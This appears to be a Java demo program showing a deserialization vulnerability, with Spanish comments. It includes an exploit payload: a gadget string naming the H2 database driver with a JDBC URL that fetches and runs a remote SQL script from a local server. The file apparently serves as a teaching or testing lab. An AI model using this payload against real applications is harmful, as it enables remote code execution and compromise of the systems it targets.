package com.example;

import java.io.IOException;

public class VulnerableApp {
    public static void main(String[] args) {
        System.out.println("--- Iniciando aplicación vulnerable ---");
        JsonProcessor processor = new JsonProcessor();

        // Escenario 1: Uso legítimo (funcionaría bien)
        String legitimateJson = "{\"id\":123, \"name\":\"Alice\"}";
        try {
            processor.processJson(legitimateJson);
        } catch (IOException e) {
            System.err.println("Error en uso legítimo: " + e.getMessage());
        }

        System.out.println("\n-----------------------------------\n");

        // Escenario 2: Simulación de un ataque manual (el que haría un atacante)
        String maliciousJson = "[\"com.h2database.Driver\", {\"url\":\"jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://localhost:8000/exploit.sql'\"}]";
        try {
            System.out.println("!!! INTENTANDO ATAQUE MANUAL !!!");
            processor.processJson(maliciousJson);
        } catch (IOException e) {
            System.err.println("!!! EL ATAQUE HA CAUSADO UN ERROR (O HA FUNCIONADO) !!!");
            e.printStackTrace();
        }

        Data data = new Data(1);
        User user = new User(123, "Alice", data);
        SecondMethodCall secondCall = new SecondMethodCall(user);
        secondCall.secondVulnerableMethodCall();
    }
}